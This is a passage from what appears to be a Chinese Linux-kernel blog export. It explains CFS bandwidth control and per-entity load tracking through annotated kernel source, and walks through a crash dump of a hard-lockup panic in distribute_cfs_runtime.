组调度，引入了此功能，该功能可以让管理员控制在一段时间内一个组可以使用 CPU 的最长时间． 0x00 CFS bandwidth control design先看看大佬是如何设计[^roadmap]这个系统的 (关注企业应用)，分为 bandwidth control 和 CFS bandwidth control 看设计。 首先是 bandwidth control 设计要先考虑两个主要面： The actual amount of CPU time available to a group is highly variable as it is dependent on the presence and execution patterns of other groups, a machine can the not be predictably partitioned without intimately understanding the behaviors of all co-scheduled applications. The maximum amount of CPU time available to a group is not predictable. While this is closely related to the first point, the distinction is worth noting as this directly affects capacity planning. 因为 SCHED_RT 也实现了 bandwidth control，这里区分出我关注的 CFS bandwidth control。 we have now opted for global specifcation of both enforcement interval (cpu.cfs_ period_us) and allowable bandwidth (cpu.cfs_ quota_us). By specifying this, the group as a whole will be limited to cpu.cfs_quota_us units of CPU time within the period of cpu.cfs_period_us. Of note is that these limits are hierarchical, unlike SCHED_RT we do not currently perform feasibility evaluaion regarding the defined limits. If a child has a more permissive bandwidth allowance than its parent, it will be indirectly throttled when the parent’s quota is exhausted. Additionally, there is the global control: /proc/sys/ kernel/sched_cfs_bandwidth_slice_us 大佬们在论文里讨论了两个方案，在 cfs bandwidth v4 版本后引入了 Hybrid global pool 实现。 如果仅实现 local pool 设计下，在大型的 SMP 系统中，计算剩余时间和存储剩余时间是一个多对多的关系，而锁的竞争导致开销大，而如果仅 tracking quota globally 依然是不能解决前面所述的问题，唯一的好处就是当 quota 没有用完，消耗的时间计算比较有效率，是因为本地 cpu 变量修改的是无锁。因此大佬们选择了一个混合方案以此来改善性能。 To each task_group a new cfs_bandwidth structure has been added. This tracks (globally) the allocated and consumed quota within a period. However, consumption does not occur against this pool directly; as in the local pool approach above there is a local, per cfs_rq, store of granted and consumed quota. This quota is acquired from the global pool in a (user configurable) batch size. When there is no quota available to re-provision a running cfs_rq, it is locally throttled until the next quota refresh. Bandwidth refresh is a periodic operation that occurs once per quota period within which all throttled run-queues are unthrottled and the global bandwidth pool is replenished. 0x01 实现分析1: 核心数据结构： 根据大佬们论文里面的设计讨论，global cpu runtime pool 的实现就是 cfs_bandwidth 结构体，其作为 task_group 的最后一个字段。quota 是限于的每 period 中的，根据我的理解，正常 task group 被调度的情况下$$period &gt;&#x3D; quota &gt;&#x3D; runtime$$，但是时间的消耗不上立刻直接反应在 global pool 中，而是在每 cfs_rq 中 local pool 中记录已经获取和消化的配额，这个配额从 global pool 中以预配置的大小获取。当没有配额来填充 cfs 中的 local pool 时候，这个 task_group 会被限制到下一次 quota 的重新分配。 1234567891011121314151617181920212223242526struct cfs_bandwidth &#123;#ifdef CONFIG_CFS_BANDWIDTH raw_spinlock_t lock; // /sys/fs/cgroup/cpu/cpu.cfs_period_us defulat: 100ms ktime_t period; // quota 为时间配额，runtime 是实际消耗的时间 u64 quota, runtime; // 是 tg 中控制配额的常数比 s64 hierarchical_quota; // 时间片的到期时间 u64 runtime_expires; int idle, period_active; // period_timer 每隔 cfs_period_us 来刷新 quota。 // slack_timer 应该是论文 6.3 的第一个问题。 struct hrtimer period_timer, slack_timer; struct list_head throttled_cfs_rq; /* statistics 注释说明是统计相关的，不关注 */ int nr_periods, nr_throttled; u64 throttled_time;#endif&#125;; 而 local pool，就是嵌入在 cfs_rq 中的这些字段了。 1234567891011121314151617struct cfs_rq &#123;...#ifdef CONFIG_SMP#ifdef CONFIG_FAIR_GROUP_SCHED...#ifdef CONFIG_CFS_BANDWIDTH int runtime_enabled; // 这个字段在 account_cfs_rq_runtime 入口做判断使用 u64 runtime_expires; // 时间片的到期时间 s64 runtime_remaining; // 进程组的剩余时间片 u64 throttled_clock, throttled_clock_task; // tg 被节流过后的信息 u64 throttled_clock_task_time; // int throttled, throttle_count; // struct list_head throttled_list; // #endif /* CONFIG_CFS_BANDWIDTH */#endif /* CONFIG_FAIR_GROUP_SCHED */&#125;; 2: 核心函数： 根据我的理解这就是论文[^roadmap]里面的 account_cfs_rq_quota() 的函数就是 account_cfs_rq_runtime() 函数，在 update_curr() 中被调，参数 delta_exec &#x3D; now - curr-&gt;exec_start。account_cfs_rq_runtime() 函数本身逻辑非常少，直接从__account_cfs_rq_runtime() 关注。 123456789101112131415161718static void __account_cfs_rq_runtime(struct cfs_rq *cfs_rq, unsigned long delta_exec)&#123; /* dock delta_exec before expiring quota (as it could span periods) */ cfs_rq-&gt;runtime_remaining -= delta_exec; // 剩余时间减去进程已经运行的时间。 expire_cfs_rq_runtime(cfs_rq); // 检查 local pool 的时间片到期时间，如果没有到期就把到期时间再往后续一口 if (likely(cfs_rq-&gt;runtime_remaining &gt; 0)) // 分支预测，也就是说代码暗示我们 local pool 剩余时间还有。 return; /* * if we&#x27;re unable to extend our runtime we resched so that the active * hierarchy can be throttled */ // 如果 local pool 没有剩余时间，就从 global pool 不能借时间。借不到的话就设置 curr 重新调度。 if (!assign_cfs_rq_runtime(cfs_rq) &amp;&amp; likely(cfs_rq-&gt;curr)) resched_task(rq_of(cfs_rq)-&gt;curr);&#125; assign_cfs_rq_runtime() 可以看到expires = cfs_b-&gt;runtime_expires;后cfs_rq-&gt;runtime_expires = expires; 和 cfs_rq-&gt;runtime_remaining += amount;这两波操作就能理解 local pool 重 global pool 借时间的细节了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445/* returns 0 on failure to allocate runtime */static int assign_cfs_rq_runtime(struct cfs_rq *cfs_rq)&#123; struct task_group *tg = cfs_rq-&gt;tg; struct cfs_bandwidth *cfs_b = tg_cfs_bandwidth(tg); u64 amount = 0, min_amount, expires; /* note: this is a positive sum as runtime_remaining &lt;= 0 */ min_amount = sched_cfs_bandwidth_slice() - cfs_rq-&gt;runtime_remaining; raw_spin_lock(&amp;cfs_b-&gt;lock); if (cfs_b-&gt;quota == RUNTIME_INF) amount = min_amount; else &#123; /* * If the bandwidth pool has become inactive, then at least one * period must have elapsed since the last consumption. * Refresh the global state and ensure bandwidth timer becomes * active. */ if (!cfs_b-&gt;timer_active) &#123; __refill_cfs_bandwidth_runtime(cfs_b); // 重新填满时间 __start_cfs_bandwidth(cfs_b); &#125; if (cfs_b-&gt;runtime &gt; 0) &#123; amount = min(cfs_b-&gt;runtime, min_amount); cfs_b-&gt;runtime -= amount; cfs_b-&gt;idle = 0; &#125; &#125; expires = cfs_b-&gt;runtime_expires; raw_spin_unlock(&amp;cfs_b-&gt;lock); cfs_rq-&gt;runtime_remaining += amount; /* * we may have advanced our local expiration to account for allowed * spread between our sched_clock and the one on which runtime was * issued. */ if ((s64)(expires - cfs_rq-&gt;runtime_expires) &gt; 0) cfs_rq-&gt;runtime_expires = expires; return cfs_rq-&gt;runtime_remaining &gt; 0;&#125; 3: enqueue 调用流程 1234const struct sched_class fair_sched_class = &#123; .next = &amp;idle_sched_class, // kernel 面向对象设计,在 core.c 中被调用。 .enqueue_task = enqueue_task_fair, 123456789101112131415161718/* * The enqueue_task method is called before nr_running is * increased. Here we update the fair scheduling stats and * then put the task into the rbtree: */static voidenqueue_task_fair(struct rq *rq, struct task_struct *p, int flags)&#123; struct cfs_rq *cfs_rq; struct sched_entity *se = &amp;p-&gt;se; // 因为需要支持组调度，而组调度下面 se 是有层次结构的，所以遍历所有调度实体。 // 如果没有组调度是没有必要获取层次信息。 for_each_sched_entity(se) &#123; if (se-&gt;on_rq) // 如果 se 已经在就绪队列上 break; cfs_rq = cfs_rq_of(se); // 获取当前 se 所在的 cfs_rq enqueue_entity(cfs_rq, se, flags); // enqueue_entity 完成 se 的真正插入操作 123456789101112131415161718192021222324252627282930313233343536static voidenqueue_entity(struct cfs_rq *cfs_rq, struct sched_entity *se, int flags)&#123; /* * Update the normalized vruntime before updating min_vruntime * through callig update_curr(). */ // 如果当前 se 不是被唤醒，或者 se 已经是在运行的了，则更新 se 的 vruntime。 if (!(flags &amp; ENQUEUE_WAKEUP) || (flags &amp; ENQUEUE_WAKING)) se-&gt;vruntime += cfs_rq-&gt;min_vruntime; /* * Update run-time statistics of the &#x27;current&#x27;. */ update_curr(cfs_rq); // 这里通向 local pool 的更新流程, 参考核心函数分析部分。 enqueue_entity_load_avg(cfs_rq, se, flags &amp; ENQUEUE_WAKEUP); account_entity_enqueue(cfs_rq, se); // 记账，更新 cfs-&gt;nr_running 和 load 等 update_cfs_shares(cfs_rq); // 更新 se 的权重 // 如果当前 se 是被唤醒的 if (flags &amp; ENQUEUE_WAKEUP) &#123; place_entity(cfs_rq, se, 0); enqueue_sleeper(cfs_rq, se); &#125; update_stats_enqueue(cfs_rq, se); check_spread(cfs_rq, se); if (se != cfs_rq-&gt;curr) __enqueue_entity(cfs_rq, se); se-&gt;on_rq = 1; if (cfs_rq-&gt;nr_running == 1) &#123; list_add_leaf_cfs_rq(cfs_rq); check_enqueue_throttle(cfs_rq); // cfs_rq 限流检查 &#125;&#125; 12345678910111213141516171819202122232425/* * When a group wakes up we want to make sure that its quota is not already * expired/exceeded, otherwise it may be allowed to steal additional ticks of * runtime as update_curr() throttling can not not trigger until it&#x27;s on-rq. */static void check_enqueue_throttle(struct cfs_rq *cfs_rq)&#123; if (!cfs_bandwidth_used()) // 如果限流没有开 return; /* an active group must be handled by the update_curr()-&gt;put() path */ if (!cfs_rq-&gt;runtime_enabled || cfs_rq-&gt;curr) // 如果 runtime 没有启用 return; /* ensure the group is not already throttled */ if (cfs_rq_throttled(cfs_rq)) // 已经限流操作了 return; /* update runtime allocation */ account_cfs_rq_runtime(cfs_rq, 0); // 再抢救一下试试 if (cfs_rq-&gt;runtime_remaining &lt;= 0) // 抢救无效，限流开始。 // 具体实现：就是 task group 限流的尾插到 cfs_rq 维护的已经限流的列表里面。 throttle_cfs_rq(cfs_rq); &#125; [^zhihu]: 现在的 Linux 内核和 Linux 2.6 的内核有多大区别？[^roadmap]: CPU bandwidth control for CFS Roadmap","tags":["linux"]},{"title":"cfs per entity load track","path":"/2017/09/21/cfs-per-entity-load-track/","content":"0x00 what and why之前公司遇到了一个系统 load avg 异常，一路追杀的过程中学习了 CFS 并发现了 cfs per entity load track 特性，凑巧的是 lwn [^lwn]的文章被阿里内核日报围绕着原来系统有什么问题，如何解决的，达到了什么成果的方法阐述了一遍： 文章首先回顾了一下任务调度器和为什么有了 CPU 利用率还需要衡量“load”。后面的内容更有意思一些：Paul Turner 的 per-entity load tracking 已经合并到 3.8 内核里。 之前的 CFS 以每个 CPU 上的运行队列 (per cpu runqueue) 为单位计算 load，但使用了 group scheduler 之后，每个 cgroup 都有一个自己的 per CPU 运行队列，而如果内核需要了解每个 cgroup 对系统整体 load 的贡献情况，原来的方案就不能满足需要了，而且基于 per CPU runqueue 的方法也有结果波动过大的缺点。 per-entity load 的方法则是把 cgroup 内的所有任务都串接到一个队列上。计算 load 时，时间以一个毫秒（准确地说是 1024µs）为单位向前滚动。一个 entity 在周期 $$p_{i}$$ 对系统 load 的贡献就是该周期内可运行部分时间（任务正在运行，或者处于就绪状态）。周期越旧，对当前 load 影响越小，具体地，令 Li 为周期$$p_{i}$$对当前负载的贡献，则当前 load 为： $$L &#x3D; L0 + L1y + L2y^2 + L3*y^3$$ 这个公式的优点是计算当前 load 不需要保存完整的历史数据，只需要累加就行了。其中，y 是小于 1 的衰减因子。目前取值为使 y32&#x3D;0.5 的值（当然计算进程是以定点方式进行的），即 32ms 之前的 load 对当前 load 有 50% 的贡献。3.8 内核里，会对阻塞掉的任务，也使用相同的计算方法，然后将”阻塞 load”与以上”CPU load”相加得到完整的 per-entity load。当然如果一个阻塞任务之后进入就绪状态，就会算入上面的 CPU load 公式里。此外，load 计算还跳过了在 CPU bandwidth controller 控制下的 throttled processes。对这些 per-entity load 求和就可以得到整个系统的 load 了。 这里补充一下特性的实现细节 (v4.14-rc2)： 0x01 cfs overview总所周知 Linux 的设计是非常优秀，非常核心的调度子系统也在代码层面做了模块化封装，简要关注一下 cfs 调度类的实现 (其它调度类也是要实现结构体中的大多数方法的)。 123456789/* * All the scheduling class methods: */const struct sched_class fair_sched_class = &#123;\t.next = &amp;idle_sched_class,\t.enqueue_task = enqueue_task_fair, // here ...#endif&#125;; 上面代码摘录自 cfs 调度类，关注入队操作 enqueue_task_fair 流程中 load 的计算细节，不关注 dequeu_task_fair 的是因为它们非常类似。 1234567891011121314151617181920212223242526272829/* * The enqueue_task method is called before nr_running is * increased. Here we update the fair scheduling stats and * then put the task into the rbtree: */static voidenqueue_task_fair(struct rq *rq, struct task_struct *p, int flags)&#123; struct cfs_rq *cfs_rq; struct sched_entity *se = &amp;p-&gt;se; /* * If in_iowait is set, the code below may not trigger any cpufreq * utilization updates, so do it here explicitly with the IOWAIT flag * passed. */ if (p-&gt;in_iowait) cpufreq_update_util(rq, SCHED_CPUFREQ_IOWAIT); ... for_each_sched_entity(se) &#123; cfs_rq = cfs_rq_of(se); cfs_rq-&gt;h_nr_running++; if (cfs_rq_throttled(cfs_rq)) break; update_load_avg(se, UPDATE_TG); // here... 以上是入队操作的实现的部分，cfs 是的操作的时间复杂度是利用 rbtree 的数据结构的优势，cfs 以 vruntime 为 value 组织 rbtree，每次选择调度实体 (se) 从最左取，更多细节参考[^LKDe3]。 1234567891011121314151617/* Update task and its cfs_rq load average */static inline void update_load_avg(struct sched_entity *se, int flags)&#123; struct cfs_rq *cfs_rq = cfs_rq_of(se); u64 now = cfs_rq_clock_task(cfs_rq); struct rq *rq = rq_of(cfs_rq); int cpu = cpu_of(rq); int decayed; /* * Track task load average for carrying it to new CPU after migrated, and * track group sched_entity load average for task_h_load calc in migration */ if (se-&gt;avg.last_update_time &amp;&amp; !(flags &amp; SKIP_AGE_LOAD)) __update_load_avg_se(now, cpu, cfs_rq, se); // here...&#125; 上述函数准备一些参数来计算 se 的 load 值，实现还是非常好理解的。 1234567static int__update_load_avg_se(u64 now, int cpu, struct cfs_rq *cfs_rq, struct sched_entity *se)&#123; return ___update_load_avg(now, cpu, &amp;se-&gt;avg, se-&gt;on_rq * scale_load_down(se-&gt;load.weight), cfs_rq-&gt;curr == se, NULL);&#125; 一个 wrapper, 传入第三个参数 se-&gt;avg 是如下见的不多的结构体： 12345678struct sched_avg &#123; u64 last_update_time; // Last load update time u64 load_sum; u32 util_sum; u32 period_contrib; // unsigned long load_avg; // runnable% * scale_load_down(load) * freq% unsigned long util_avg; // running% * SCHED_CAPACITY_SCALE * freq% * capacity%&#125;; 下面有如何初始化一个 se-&gt;avg 的函数对上面结构体解释非常到位。 12345678910111213141516171819202122232425262728/* Give new sched_entity start runnable values to heavy its load in infant time */void init_entity_runnable_average(struct sched_entity *se)&#123; struct sched_avg *sa = &amp;se-&gt;avg; sa-&gt;last_update_time = 0; /* * sched_avg&#x27;s period_contrib should be strictly less then 1024, so * we give it 1023 to make sure it is almost a period (1024us), and * will definitely be update (after enqueue). */ sa-&gt;period_contrib = 1023; /* * Tasks are intialized with full load to be seen as heavy tasks until * they get a chance to stabilize to their real load level. * Group entities are intialized with zero load to reflect the fact that * nothing has been attached to the task group yet. */ if (entity_is_task(se)) sa-&gt;load_avg = scale_load_down(se-&gt;load.weight); sa-&gt;load_sum = sa-&gt;load_avg * LOAD_AVG_MAX; /* * At this point, util_avg won&#x27;t be used in select_task_rq_fair anyway */ sa-&gt;util_avg = 0; sa-&gt;util_sum = 0; /* when this task enqueue&#x27;ed, it will contribute to its cfs_rq&#x27;s load_avg */&#125; 0x02 core path: ___update_load_avg这是 per entity load track 重要的入口函数，在 4.12 之前实现与之前不一样，优化方法是在 patch[^Optimize]中引入的，但是思路一致。开发者用几何级数来表示历史上 se 贡献的 runnable average，这样做首先需要把 runable 的全部时间切分成近似 1024 us (约 1ms) 的时间片，并标记时间片为 N-ms 之前为 $$p_N$$, 比如 $$p_0$$ 就表示当前的时间片，示意图如下： |&lt;- 1024us -&gt;|&lt;- 1024us -&gt;|&lt;- 1024us -&gt;|| p0 | p1 | p2 || (now) | (1ms ago) | (2ms ago)| 让 $$u_i$$ 表示 $$p_i$$ 中调度实体可以运行的的一部分。 然后我们指定$$u_i$$为系数，则产生如下计算之前负载的等式： $$u_0 + u_1y + u_2y^2 + u_3*y^3 + …$$ 基于合理的调度周期选择 y，修正公式如下： $$y^{32} &#x3D; 0.5$$ 这意味大约 32ms $$u_{32}$$ 之前的负载贡献经过加权后计算大约是当前一毫秒 $$u_0$$ 的一半。 如果发生了时间片的 rolls over 现象，会产生了新$${u_0}’$$,这时用新的$${u_0}’$$加上 y 乘以之前的和就可以解决这个问题。 $$ \\begin{align*} load_avg &amp;&#x3D; {u_0}’ + y*(u_0 + u_1y + u_2y^2 + … ) \\ &amp;&#x3D; u_0 + u_1y + u_2y^2 + … [re-labeling u_i -&gt; u_{i+1}] \\end{align*} $$ 而 __update_load_avg 函数本身除了做了一些异常检查，最最核心的部分就是调用 accumulate_sum 计算 load，然后更新 sched_avg。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859static __always_inline int___update_load_avg(u64 now, int cpu, struct sched_avg *sa, unsigned long weight, int running, struct cfs_rq *cfs_rq)&#123; u64 delta; delta = now - sa-&gt;last_update_time; // 计算新采样周期的值 /* * This should only happen when time goes backwards, which it * unfortunately does during sched clock init when we swap over to TSC. */ if ((s64)delta &lt; 0) &#123; sa-&gt;last_update_time = now; return 0; &#125; /* * Use 1024ns as the unit of measurement since it&#x27;s a reasonable * approximation of 1us and fast to compute. */ delta &gt;&gt;= 10; // 把周期值由 ns 转化为 us if (!delta) return 0; sa-&gt;last_update_time += delta &lt;&lt; 10; // 上一步的逆操作并更新 sa-&gt;last_update_time /* * running is a subset of runnable (weight) so running can&#x27;t be set if * runnable is clear. But there are some corner cases where the current * se has been already dequeued but cfs_rq-&gt;curr still points to it. * This means that weight will be 0 but not running for a sched_entity * but also for a cfs_rq if the latter becomes idle. As an example, * this happens during idle_balance() which calls * update_blocked_averages() */ if (!weight) running = 0; /* * Now we know we crossed measurement unit boundaries. The *_avg * accrues by two steps: * * Step 1: accumulate *_sum since last_update_time. If we haven&#x27;t * crossed period boundaries, finish. */ if (!accumulate_sum(delta, cpu, sa, weight, running, cfs_rq)) // look here !!! 计算累计出来的 load return 0; /* * Step 2: update *_avg. */ sa-&gt;load_avg = div_u64(sa-&gt;load_sum, LOAD_AVG_MAX - 1024 + sa-&gt;period_contrib); if (cfs_rq) &#123; cfs_rq-&gt;runnable_load_avg = div_u64(cfs_rq-&gt;runnable_load_sum, LOAD_AVG_MAX - 1024 + sa-&gt;period_contrib); &#125; sa-&gt;util_avg = sa-&gt;util_sum / (LOAD_AVG_MAX - 1024 + sa-&gt;period_contrib); return 1;&#125; 下面这个函数 accumulate_sum 非常核心，它通过累加三个部分的总和来计算 se 的负载影响；d1 是离当前时间最远（不完整的）period 的剩余部分，d2 是完整 period 的而 d3 是（不完整的）当前 period 的剩余部分。d1，d2，d3 的示意图如下： 12345 d1 d2 d3 ^ ^ ^ | | | |&lt;-&gt;|&lt;-----------------&gt;|&lt;---&gt;|... |---x---|------| ... |------|-----x (now) 计算公式如下： $$\\begin{align*}{u}’ &amp;&#x3D; (u + d1) y^{p} + 1024 \\sum_{n&#x3D;1}^{p-1}y^{n} + d3\\times y^0 \\&amp; &#x3D; u\\times y^{p} + d1\\times y^{p} + 1024 \\sum_{n&#x3D;1}^{p-1} y^{n} + d3\\times y^{0}\\end{align*}$$ 拆分上述公式为$$u\\times y^{p}$$ 为 step 1， $$d1\\times y^{p} + 1024 \\sum_{n&#x3D;1}^{p-1} y^{n} + d3\\times y^{0}$$为 step 2 如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748static __always_inline u32accumulate_sum(u64 delta, int cpu, struct sched_avg *sa, unsigned long weight, int running, struct cfs_rq *cfs_rq)&#123; unsigned long scale_freq, scale_cpu; u32 contrib = (u32)delta; /* p == 0 -&gt; delta &lt; 1024 */ u64 periods; scale_freq = arch_scale_freq_capacity(NULL, cpu); scale_cpu = arch_scale_cpu_capacity(NULL, cpu); // 参考前面的 sched_avg 的第一次介绍，上述两个是计算需要的参数。 delta += sa-&gt;period_contrib; periods = delta / 1024; /* A period is 1024us (~1ms), 这边求出的就是上述图的 d2 的大小 */ /* * Step 1: decay old *_sum if we crossed period boundaries. */ if (periods) &#123; sa-&gt;load_sum = decay_load(sa-&gt;load_sum, periods); // 衰减 se-&gt;sa-&gt;load_sum， 现在要根据指数衰减老的值。 if (cfs_rq) &#123; cfs_rq-&gt;runnable_load_sum = decay_load(cfs_rq-&gt;runnable_load_sum, periods); // 如果 se 在 cfs_rq 上，衰减 cfs_rq 的 load。 &#125; sa-&gt;util_sum = decay_load((u64)(sa-&gt;util_sum), periods); // 衰减 se-&gt;sa-&gt;util_sum /* * Step 2 * commit: 05296e7535d67ba4926b543a09cf5d430a815cb6 */ delta %= 1024; // delta 表示 d3 的时间长度。 contrib = __accumulate_pelt_segments(periods, 1024 - sa-&gt;period_contrib, delta); // 这个函数是核心计算方法，参数：d2，d1，d3 &#125; sa-&gt;period_contrib = delta; contrib = cap_scale(contrib, scale_freq); // #define cap_scale(v, s) ((v)*(s) &gt;&gt; SCHED_CAPACITY_SHIFT) if (weight) &#123; sa-&gt;load_sum += weight * contrib; if (cfs_rq) // se 在 cfs_rq 上也要更新 rq-&gt;runnable_load_sum cfs_rq-&gt;runnable_load_sum += weight * contrib; &#125; if (running) sa-&gt;util_sum += contrib * scale_cpu; return periods;&#125; 下面几个函数是计算细节 $$c1 &#x3D; d1 \\times y^{p}$$, $$c2 &#x3D; 1024 (\\sum_{n&#x3D;0}^{inf} y^{n} - \\sum_{n-p}^{inf} y^{n} - y^{0})$$, $$c3 &#x3D; d3$$： 1234567static u32 __accumulate_pelt_segments(u64 periods, u32 d1, u32 d3)&#123; u32 c1, c2, c3 = d3; /* y^0 == 1 */ c1 = decay_load((u64)d1, periods); c2 = LOAD_AVG_MAX - decay_load(LOAD_AVG_MAX, periods) - 1024; return c1 + c2 + c3;&#125; 1234567891011121314151617181920212223242526272829/* * Approximate: * val * y^n, where y^32 ~= 0.5 (~1 scheduling period) */static u64 decay_load(u64 val, u64 n)&#123; unsigned int local_n; if (unlikely(n &gt; LOAD_AVG_PERIOD * 63)) return 0; /* after bounds checking we can collapse to 32-bit */ local_n = n; /* * As y^PERIOD = 1/2, we can combine * y^n = 1/2^(n/PERIOD) * y^(n%PERIOD) * With a look-up table which covers y^n (n&lt;PERIOD) * * To achieve constant time decay_load. */ if (unlikely(local_n &gt;= LOAD_AVG_PERIOD)) &#123; val &gt;&gt;= local_n / LOAD_AVG_PERIOD; local_n %= LOAD_AVG_PERIOD; &#125; val = mul_u64_u32_shr(val, runnable_avg_yN_inv[local_n], 32); return val;&#125; 使用常量 runnable_avg_yN_inv 数组使得计算 load 衰减加速，数组生成代码位于 Documentation&#x2F;scheduler&#x2F;sched-pelt.c，计算公式如下 $$runnable_avg_yN_inv[k] &#x3D; y^{k}\\times 2^{32}, 1\\leq k \\leq 32$$ 12345678910/* Generated by Documentation/scheduler/sched-pelt; do not modify. */static const u32 runnable_avg_yN_inv[] = &#123;\t0xffffffff, 0xfa83b2da, 0xf5257d14, 0xefe4b99a, 0xeac0c6e6, 0xe5b906e6,\t0xe0ccdeeb, 0xdbfbb796, 0xd744fcc9, 0xd2a81d91, 0xce248c14, 0xc9b9bd85,\t0xc5672a10, 0xc12c4cc9, 0xbd08a39e, 0xb8fbaf46, 0xb504f333, 0xb123f581,\t0xad583ee9, 0xa9a15ab4, 0xa5fed6a9, 0xa2704302, 0x9ef5325f, 0x9b8d39b9,\t0x9837f050, 0x94f4efa8, 0x91c3d373, 0x8ea4398a, 0x8b95c1e3, 0x88980e80,\t0x85aac367, 0x82cd8698,&#125;; [^lwn]: Per-entity load tracking[^LKDe3]: Linux Kernel Development[^Optimize]: sched&#x2F;fair: Optimize __update_sched_avg()","tags":["linux"]},{"title":"a panic of watchdog hard lockup","path":"/2017/09/02/a-panice-of-watchdog/","content":"这个周一早上来工作被告知上周有 4 台物理 crash 了，需要诊断修复， 表象： 123456789101112131415161718192021222324252627282930313233343536373839404142434445 #0 [ffff88103fbc59f0] machine_kexec at ffffffff81059beb #1 [ffff88103fbc5a50] __crash_kexec at ffffffff81105822 #2 [ffff88103fbc5b20] panic at ffffffff81680541 #3 [ffff88103fbc5ba0] nmi_panic at ffffffff81085abf #4 [ffff88103fbc5bb0] watchdog_overflow_callback at ffffffff8112f879 #5 [ffff88103fbc5bc8] __perf_event_overflow at ffffffff81174d2e #6 [ffff88103fbc5c00] perf_event_overflow at ffffffff81175974 #7 [ffff88103fbc5c10] intel_pmu_handle_irq at ffffffff81009d88 #8 [ffff88103fbc5e38] perf_event_nmi_handler at ffffffff8168ed6b #9 [ffff88103fbc5e58] nmi_handle at ffffffff816901b7#10 [ffff88103fbc5eb0] do_nmi at ffffffff816903c3#11 [ffff88103fbc5ef0] end_repeat_nmi at ffffffff8168f5d3 [exception RIP: update_curr+15] RIP: ffffffff810ce3cf RSP: ffff88103fbc3db8 RFLAGS: 00000002 RAX: 0000000000000001 RBX: ffff88092b2ed200 RCX: 0000000000000001 RDX: 0000000000000001 RSI: ffff88092b2ed200 RDI: ffff880f6afb8600 RBP: ffff88103fbc3dd0 R8: ffff88103d2b7500 R9: 0000000000000001 R10: 0000000000000000 R11: 0000000000000000 R12: ffff880f6afb8600 R13: 0000000000000001 R14: 0000000000000003 R15: ffff8813bf7f5548 ORIG_RAX: ffffffffffffffff CS: 0010 SS: 0018--- &lt;NMI exception stack&gt; ---#12 [ffff88103fbc3db8] update_curr at ffffffff810ce3cf#13 [ffff88103fbc3dd8] enqueue_entity at ffffffff810d042d#14 [ffff88103fbc3e20] unthrottle_cfs_rq at ffffffff810d16f4#15 [ffff88103fbc3e58] distribute_cfs_runtime at ffffffff810d1932#16 [ffff88103fbc3ea0] sched_cfs_period_timer at ffffffff810d1acf#17 [ffff88103fbc3ed8] __hrtimer_run_queues at ffffffff810b4d72#18 [ffff88103fbc3f30] hrtimer_interrupt at ffffffff810b5310#19 [ffff88103fbc3f80] local_apic_timer_interrupt at ffffffff81051037#20 [ffff88103fbc3f98] smp_apic_timer_interrupt at ffffffff81699f0f#21 [ffff88103fbc3fb0] apic_timer_interrupt at ffffffff8169845d--- &lt;IRQ stack&gt; ---#22 [ffff8801699a3de8] apic_timer_interrupt at ffffffff8169845d [exception RIP: native_safe_halt+6] RIP: ffffffff81060fe6 RSP: ffff8801699a3e98 RFLAGS: 00000286 RAX: 00000000ffffffed RBX: ffff88103fbcd080 RCX: 0100000000000000 RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000046 RBP: ffff8801699a3e98 R8: 0000000000000000 R9: 0000000000000000 R10: 0000000000000000 R11: 0000000000000000 R12: 00099b9bb0645f00 R13: ffff88103fbcfde0 R14: f21bf8c4662d3c34 R15: 0000000000000082 ORIG_RAX: ffffffffffffff10 CS: 0010 SS: 0018#23 [ffff8801699a3ea0] default_idle at ffffffff810347ff#24 [ffff8801699a3ec0] arch_cpu_idle at ffffffff81035146#25 [ffff8801699a3ed0] cpu_startup_entry at ffffffff810e82f5#26 [ffff8801699a3f28] start_secondary at ffffffff8104f0da 影响范围： 确认的范围有 Linux 3.10.0-514.26.2.el7 解决方案： 等待上游合并 patch c06f04c70489b9deea3212af8375e2f0c2f0b184 原因^patch： distribute_cfs_runtime() intentionally only hands out enough runtime to bring each cfs_rq to 1 ns of runtime, expecting the cfs_rqs to then take the runtime they need only once they actually get to run. However, if they get to run sufficiently quickly, the period timer is still in distribute_cfs_runtime() and no runtime is available, causing them to throttle. Then distribute has to handle them again, and this can go on until distribute has handed out all of the runtime 1ns at a time, which takes far too long. 诊断过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647crash&gt; btPID: 0 TASK: ffff880169986dd0 CPU: 7 COMMAND: &quot;swapper/7&quot; #0 [ffff88103fbc59f0] machine_kexec at ffffffff81059beb #1 [ffff88103fbc5a50] __crash_kexec at ffffffff81105822 #2 [ffff88103fbc5b20] panic at ffffffff81680541 #3 [ffff88103fbc5ba0] nmi_panic at ffffffff81085abf #4 [ffff88103fbc5bb0] watchdog_overflow_callback at ffffffff8112f879 #5 [ffff88103fbc5bc8] __perf_event_overflow at ffffffff81174d2e #6 [ffff88103fbc5c00] perf_event_overflow at ffffffff81175974 #7 [ffff88103fbc5c10] intel_pmu_handle_irq at ffffffff81009d88 #8 [ffff88103fbc5e38] perf_event_nmi_handler at ffffffff8168ed6b #9 [ffff88103fbc5e58] nmi_handle at ffffffff816901b7#10 [ffff88103fbc5eb0] do_nmi at ffffffff816903c3#11 [ffff88103fbc5ef0] end_repeat_nmi at ffffffff8168f5d3 [exception RIP: update_curr+15] RIP: ffffffff810ce3cf RSP: ffff88103fbc3db8 RFLAGS: 00000002 RAX: 0000000000000001 RBX: ffff88092b2ed200 RCX: 0000000000000001 RDX: 0000000000000001 RSI: ffff88092b2ed200 RDI: ffff880f6afb8600 RBP: ffff88103fbc3dd0 R8: ffff88103d2b7500 R9: 0000000000000001 R10: 0000000000000000 R11: 0000000000000000 R12: ffff880f6afb8600 R13: 0000000000000001 R14: 0000000000000003 R15: ffff8813bf7f5548 ORIG_RAX: ffffffffffffffff CS: 0010 SS: 0018--- &lt;NMI exception stack&gt; ---#12 [ffff88103fbc3db8] update_curr at ffffffff810ce3cf#13 [ffff88103fbc3dd8] enqueue_entity at ffffffff810d042d#14 [ffff88103fbc3e20] unthrottle_cfs_rq at ffffffff810d16f4#15 [ffff88103fbc3e58] distribute_cfs_runtime at ffffffff810d1932#16 [ffff88103fbc3ea0] sched_cfs_period_timer at ffffffff810d1acf#17 [ffff88103fbc3ed8] __hrtimer_run_queues at ffffffff810b4d72#18 [ffff88103fbc3f30] hrtimer_interrupt at ffffffff810b5310#19 [ffff88103fbc3f80] local_apic_timer_interrupt at 